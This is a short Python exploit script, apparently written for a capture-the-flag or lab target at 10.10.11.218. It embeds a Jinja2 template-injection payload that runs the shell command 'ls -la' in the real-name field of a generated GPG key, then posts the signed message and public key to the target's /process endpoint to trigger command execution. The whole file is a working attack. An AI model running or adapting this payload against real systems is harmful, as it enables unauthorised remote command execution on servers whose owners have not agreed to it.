import gnupg
import requests

cmd = "{{request.application.__globals__.__builtins__.__import__('os').popen('ls -la').read()}}"
gpg = gnupg.GPG(gnupghome='/home/YOURUSERNAME/.gnupg')
passphrase = "Rad5EnDA"

input_data = gpg.gen_key_input(
    name_real = cmd,
    name_email = "myuser@email.com",
    passphrase = passphrase
)

key = gpg.gen_key(input_data)

# Used to reference the key later
key_fp = key.fingerprint

# Submit the "Verify Signature" request
signed_text = gpg.sign("test signed message", keyid=key_fp, passphrase=passphrase)
public_key = gpg.export_keys(key_fp, armor=True)

url = "https://10.10.11.218/process"
data = {
    'signed_text': signed_text,
    'public_key': public_key
}
r = requests.post(url, data=data, verify=False)
print(r.text)

# Cleanup keys - first private then public
str(gpg.delete_keys(key_fp, True, passphrase=passphrase))
str(gpg.delete_keys(key_fp, passphrase=passphrase))
